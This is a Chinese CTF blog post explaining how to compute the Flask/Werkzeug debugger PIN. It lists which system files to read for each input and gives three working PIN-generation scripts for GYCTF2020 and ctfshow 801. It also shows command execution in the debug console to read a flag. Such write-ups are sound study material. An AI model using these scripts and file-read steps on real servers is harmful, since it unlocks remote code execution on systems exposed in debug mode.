<!DOCTYPE html>
<html>
    <head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
  <meta name="robots" content="index, follow">
  <!-- title -->
  
    
  <title>PythonPin码 - Hello Hehanzzz~</title>
    
  
  
  <!-- open graph -->
  <meta name="description" content="0x01 Pin码生成六要素 username ——》 用户名root modname ——》 flask.app getattr(app,”__name__“,app.__class__.__name__) ——》 flask getattr(mod,”__file__“,None) ——》 flask目录下的一个app.py绝对路径 str(uuid.getnode()) ——》 mac地址十">
<meta property="og:type" content="article">
<meta property="og:title" content="PythonPin码">
<meta property="og:url" content="https://hehanzzz.github.io/2023/12/20/PythonPin%E7%A0%81/index.html">
<meta property="og:site_name" content="Hello Hehanzzz~">
<meta property="og:description" content="0x01 Pin码生成六要素 username ——》 用户名root modname ——》 flask.app getattr(app,”__name__“,app.__class__.__name__) ——》 flask getattr(mod,”__file__“,None) ——》 flask目录下的一个app.py绝对路径 str(uuid.getnode()) ——》 mac地址十">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061256829.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061256299.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061256251.png">
<meta property="og:image" content="http://oss.hehanzzz.icu/img/202405061256273.png">
<meta property="article:published_time" content="2023-12-19T16:28:11.000Z">
<meta property="article:modified_time" content="2025-01-06T08:37:21.543Z">
<meta property="article:author" content="Hehanzzz">
<meta property="article:tag" content="Python">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://oss.hehanzzz.icu/img/202405061256829.png">
  <!-- canonical -->
  
  <link rel="canonical" href="https://hehanzzz.github.io/2023/12/20/PythonPin码/">
  
  <!-- Favicon -->
  <link rel="shortcut icon" href="/img/3.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
  <!-- CSS -->
  
<link rel="stylesheet" href="/css/reset.css">

  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/markdown.css">

  
<link rel="stylesheet" href="/css/fonts.css">

<meta name="generator" content="Hexo 7.0.0"></head>

    <body>
        <div class="paper">
            <div class="paper-main">
                
                    <div class="post-header">
    <a class="logo" href="/">Hello Hehanzzz~</a>
    <!-- <div class="logo"><a href="/" title="Len"><img src="/img/logo.svg" alt="Len" aria-label="logo" height="20"></a></div> -->
        <ul class="nav">
            
            <li><a href="/">Home</a></li>
            
            <li><a href="/about">About</a></li>
            
            <li><a href="/archives">Archives</a></li>
            
            <li><a href="/friends">Friends</a></li>
            
        </ul>


    </a>
</div>


                
                <div class="post-main">
    
        <div class="post-main-title">
            PythonPin码
        </div>
        <div class="post-meta">
            2023-12-20 ｜ 
            
        </div>
        <!-- 圆角分类 -->
        <!-- <div class="tags"> -->
            <!--  -->
        <!-- </div> -->
        <div class="post-md">
            <h1 id="0x01-Pin码生成六要素"><a href="#0x01-Pin码生成六要素" class="headerlink" title="0x01 Pin码生成六要素"></a>0x01 Pin码生成六要素</h1><ol>
<li>username ——》 用户名root</li>
<li>modname ——》 flask.app</li>
<li>getattr(app,”__name__“,app.__class__.__name__) ——》 flask</li>
<li>getattr(mod,”__file__“,None) ——》 flask目录下的一个app.py绝对路径</li>
<li>str(uuid.getnode()) ——》 mac地址十进制</li>
<li>get_machine_id() ——》 根据操作系统不同，有四种获取方法</li>
</ol>
<h2 id="1-username"><a href="#1-username" class="headerlink" title="1. username"></a>1. username</h2><p>去读etc&#x2F;passwd里可以看到用户名，1000以上的一般为人为创建的</p>
<p>默认用户为root</p>
<h2 id="2-modname"><a href="#2-modname" class="headerlink" title="2. modname"></a>2. modname</h2><p>默认为flask.app</p>
<h2 id="3-getattr-app-”-name-“-app-class-name-【AppName】"><a href="#3-getattr-app-”-name-“-app-class-name-【AppName】" class="headerlink" title="3. getattr(app,”__name__“,app.__class__.__name__)【AppName】"></a>3. getattr(app,”__name__“,app.__class__.__name__)【AppName】</h2><p>默认为flask</p>
<h2 id="4-getattr-mod-”-file-“-None-【ModName】"><a href="#4-getattr-mod-”-file-“-None-【ModName】" class="headerlink" title="4. getattr(mod,”__file__“,None)【ModName】"></a>4. getattr(mod,”__file__“,None)【ModName】</h2><p>如果用的不是ednv的话一般为默认路径，网上可以找得到</p>
<p>如果是的话去让网页报错，比如路由下加一个&#x2F;debug啥的让网页报错出真实绝对路径</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061256829.png"></p>
<p>在这里可以看到版本为2.7，2.7版本下默认路径python2.7内是app.pyc</p>
<p>所以真实路径为 &#x2F;opt&#x2F;Python&#x2F;flaskdebug&#x2F;lib&#x2F;python2.7&#x2F;site-packages&#x2F;flask&#x2F;app.pyc </p>
<h2 id="5-str-uuid-getnode"><a href="#5-str-uuid-getnode" class="headerlink" title="5. str(uuid.getnode())"></a>5. str(uuid.getnode())</h2><p>直接读取mac地址，如果是Ubuntu系统去读取 &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address </p>
<p>如果是centos去读取 &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth33&#x2F;address </p>
<p>mac地址需要转化为10进制！</p>
<p>转换方法：例如 02:42:ac:0c:7b:85 将冒号去掉得到 0242ac0c7b85 可以用python&#96;int(‘0242ac0c7b85’,16) ​也可以用工具直接16进制转10进制</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061256299.png"></p>
<h2 id="6-get-machine-id"><a href="#6-get-machine-id" class="headerlink" title="6. get_machine_id()"></a>6. get_machine_id()</h2><p>一般题目都为docker环境，所以需要读取两个部分进行拼接</p>
<p>首先是 &#x2F;etc&#x2F;machine-id （在前）</p>
<p>如何是 &#x2F;proc&#x2F;self&#x2F;cgroup （docker第一行最后一部分）</p>
<p><img src="http://oss.hehanzzz.icu/img/202405061256251.png"></p>
<p> &#x2F;etc&#x2F;machine-id 读不到就去读 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id </p>
<p><code>self 被过滤的时候，也就是 /proc/self/cgroup 没法用了，其中的</code>self 可以用相关进程的pid去替换,其实 1 就行</p>
<p>如果<code>cgroup 被过滤了，可以考虑</code>mountinfo 或者&#96;cpuset </p>
<h1 id="0x02-2-7版本Pin码脚本-MD5"><a href="#0x02-2-7版本Pin码脚本-MD5" class="headerlink" title="0x02 2.7版本Pin码脚本 MD5"></a>0x02 2.7版本Pin码脚本 MD5</h1><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><pre><code class="highlight python"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain
<span class="keyword">import</span> hashlib
probably_public_bits = [
    <span class="string">&#x27;flaskweb&#x27;</span>,  <span class="comment"># username</span>
    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname</span>
    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span>
    <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span>
    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>
]

private_bits = [
    <span class="string">&#x27;2485377871320&#x27;</span>  <span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span>
    <span class="comment"># get_machine_id(),/etc/machine-id</span>
    <span class="string">&#x27;31c24e0fd34a09126aa47d88e21b8b28efcce8acd630632e4e4a9baddff38757&#x27;</span>,
]

h = hashlib.md5()
<span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):
    <span class="keyword">if</span> <span class="keyword">not</span> bit:
        <span class="keyword">continue</span>
    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):
        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)
    h.update(bit)
h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)

cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]

num = <span class="literal">None</span>
<span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:
    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)
    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]

rv = <span class="literal">None</span>
<span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:
    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:
        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:
            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)
                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))
            <span class="keyword">break</span>
    <span class="keyword">else</span>:
        rv = num

<span class="built_in">print</span>(rv)</code></pre>

<h1 id="0x03-3-6版本Pin码脚本-MD5"><a href="#0x03-3-6版本Pin码脚本-MD5" class="headerlink" title="0x03 3.6版本Pin码脚本 MD5"></a>0x03 3.6版本Pin码脚本 MD5</h1><pre><code class="highlight python"><span class="comment">#MD5</span>
<span class="keyword">import</span> hashlib
<span class="keyword">from</span> itertools <span class="keyword">import</span> chain
probably_public_bits = [
     <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span>
     <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span>
     <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span>
     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span>
]

private_bits = [
     <span class="string">&#x27;25214234362297&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span>
]

h = hashlib.md5()
<span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):
    <span class="keyword">if</span> <span class="keyword">not</span> bit:
        <span class="keyword">continue</span>
    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):
        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)
    h.update(bit)
h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)

cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]

num = <span class="literal">None</span>
<span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:
   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)
   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]

rv =<span class="literal">None</span>
<span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:
   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:
       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:
          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)
                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))
          <span class="keyword">break</span>
       <span class="keyword">else</span>:
          rv = num

<span class="built_in">print</span>(rv)</code></pre>

<h1 id="0x04-3-8版本Pin码脚本-sha1"><a href="#0x04-3-8版本Pin码脚本-sha1" class="headerlink" title="0x04 3.8版本Pin码脚本 sha1"></a>0x04 3.8版本Pin码脚本 sha1</h1><h2 id="Ctfshow-801"><a href="#Ctfshow-801" class="headerlink" title="Ctfshow 801"></a>Ctfshow 801</h2><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7092759891089031175">ctfshow web801 - 掘金 (juejin.cn)</a>​【内含各版本Pin码生成原理】</p>
<pre><code class="highlight python"><span class="keyword">import</span> hashlib
<span class="keyword">from</span> itertools <span class="keyword">import</span> chain
probably_public_bits = [
    <span class="string">&#x27;root&#x27;</span><span class="comment"># /etc/passwd</span>
    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span>
    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span>
    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span>
]

private_bits = [
    <span class="string">&#x27;2485377596293&#x27;</span>,<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span>
    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span>
    <span class="string">&#x27;26657bfd-2d70-45fa-97b3-99462feda8933604b88d15b463a021ad397d6012c89f17fae43b0607b655125a00e8f6735d16&#x27;</span><span class="comment">#  /proc/self/cgroup</span>
]

h = hashlib.sha1()
<span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):
    <span class="keyword">if</span> <span class="keyword">not</span> bit:
        <span class="keyword">continue</span>
    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):
        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)
    h.update(bit)
h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)

cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]

num = <span class="literal">None</span>
<span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:
    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)
    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]

rv =<span class="literal">None</span>
<span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:
    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:
        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:
            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)
                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))
            <span class="keyword">break</span>
    <span class="keyword">else</span>:
        rv = num

<span class="built_in">print</span>(rv)</code></pre>

<h2 id="RCE后利用"><a href="#RCE后利用" class="headerlink" title="RCE后利用"></a>RCE后利用</h2><pre><code class="highlight python"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os
<span class="meta">&gt;&gt;&gt; </span>os.popen(<span class="string">&#x27;ls /&#x27;</span>).read()
<span class="string">&#x27;app\nbin\ndev\netc\nflag\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun  </span>
<span class="string">&gt;&gt;&gt; os.popen(&#x27;</span>cat /flag<span class="string">&#x27;).read()</span>
<span class="string">&#x27;</span>ctfshow&#123;a9899ac6-<span class="number">2446</span>-4b68-<span class="number">9826</span>-a5b523c2ce28&#125;\n<span class="string">&#x27;</span></code></pre>

<p><img src="http://oss.hehanzzz.icu/img/202405061256273.png"></p>

        </div>
    
<!-- tags -->

    <div class="post-meta">
        标签：
        
            <a href="/tags/Python/"> / Python</a>
        
    </div>

</div>
                <div class="footer">
    <span>Copyright © <script>document.write(new Date().getFullYear())</script> Hello Hehanzzz~</span>
    <span>Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> with <a target="_blank" rel="noopener" href="https:///imzl.com/zenmind">ZenMind</a></span>
</div>

<link rel="stylesheet" href="/css/a11y-dark.min.css">


<script src="/js/highlight.min.js"></script>


<script src="/js/highlightjs-line-numbers.js"></script>

<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>

            </div>
        </div>
    </body>
</html>